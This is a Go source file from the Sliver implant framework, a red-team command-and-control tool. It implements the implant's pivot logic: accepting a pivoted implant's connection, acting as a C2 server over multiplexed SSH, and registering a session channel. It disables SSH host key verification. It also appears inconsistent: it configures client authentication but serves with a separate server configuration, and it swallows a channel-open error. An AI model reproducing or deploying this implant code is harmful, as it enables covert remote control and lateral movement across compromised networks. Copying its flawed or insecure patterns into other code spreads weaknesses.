package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"io"
	"net"
	"sync"

	"github.com/golang/protobuf/proto"
	"golang.org/x/crypto/ssh"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// InitPivot - Same as Init(), but used when the implant is handling a pivoted implant connection.
func InitPivot(conn net.Conn, key []byte) (sessionStream io.ReadWriteCloser, err error) {
	// Return if we don't have what we need.
	if conn == nil {
		return nil, errors.New("net.Conn is nil, cannot init Comm")
	}

	// New SSH multiplexer Comm
	comm := &Comm{mutex: &sync.RWMutex{}}

	// Pepare the SSH conn/security, and set keepalive policies/handlers.
	err = comm.setupAuthPivot(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup SSH client connection: %s", err.Error())
		// {{end}}
		return nil, err
	}

	// {{if .Config.Debug}}
	log.Printf("Initiating SSH client connection...")
	// {{end}}

	// We act as the C2 server here.
	comm.sshConn, comm.inbound, comm.requests, err = ssh.NewServerConn(conn, comm.serverConfig)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to initiate SSH connection: %s", err.Error())
		// {{end}}
		return
	}

	go comm.serveRequests() // Serve pings & requests with keepalive policies
	comm.checkLatency()     // Get latency for this tunnel.

	// Get a stream for the session, if not through a tunnel.
	sessionStream, err = comm.initSessionPivot()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("failed to setup C2 stream: %s", err.Error())
		// {{end}}
		return
	}

	Comms.Add(comm)                // Everything is up and running, register the mux.
	go comm.handleServerIncoming() // Handle requests (pings) and incoming connections in the background.

	return
}

// setupAuthPivot - The Comm prepares SSH code and security details as if we were the server.
func (comm *Comm) setupAuthPivot(key []byte) (err error) {

	// Encryption & authentication
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("SSH failed to parse Private Key: %s", err.Error())
		// {{end}}
		return
	}

	comm.clientConfig.Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	comm.clientConfig.HostKeyCallback = ssh.InsecureIgnoreHostKey()

	// Keep-alives and other

	return
}

// initSessionPivot - We act as the C2 server by requiring a stream, but in turn we give it back to the server.
func (comm *Comm) initSessionPivot() (stream io.ReadWriteCloser, err error) {
	if comm.sshConn == nil {
		// {{if .Config.Debug}}
		log.Printf("Tried to open channel on nil SSH connection")
		// {{end}}
		return
	}
	info := &sliverpb.ConnectionInfo{ID: "REGISTRATION"}
	data, _ := proto.Marshal(info)
	dst, reqs, err := comm.sshConn.OpenChannel("session", data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to open Session RPC channel: %s", err.Error())
		// {{end}}
	}
	go ssh.DiscardRequests(reqs)

	// {{if .Config.Debug}}
	log.Printf("Opened Session stream")
	// {{end}}
	return dst, nil
}
